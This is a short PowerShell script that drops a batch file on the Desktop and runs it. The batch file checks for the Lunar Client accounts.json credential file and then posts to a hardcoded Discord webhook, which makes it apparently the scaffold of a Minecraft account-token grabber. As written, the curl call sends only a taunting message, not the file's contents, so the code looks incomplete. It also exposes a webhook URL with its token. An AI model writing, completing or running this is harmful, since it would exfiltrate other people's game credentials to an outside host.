# Define the path for the batch file
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'

# Define the content of the batch file
$batchContent = @"
@echo off
setlocal enabledelayedexpansion

:: Discord Webhook URL
set webhookUrl=https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX

:: Check if accounts.json exists
set filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json
if not exist "%filePath%" (
    echo accounts.json not found.
    exit /b
)

:: Message to send
set message=Here you go king :pray:

:: Escape the message for CURL
set payload={""content"":""%message%""}

:: Send Request
curl -X POST %webhookUrl% ^
    -H ""Content-Type: application/json"" ^
    -d ""%payload%""

echo Process finished.
endlocal
"@

# Create the batch file
Set-Content -Path $batchFilePath -Value $batchContent

# Run the batch file
Start-Process -FilePath $batchFilePath
Write-Host "Webhook message sent."
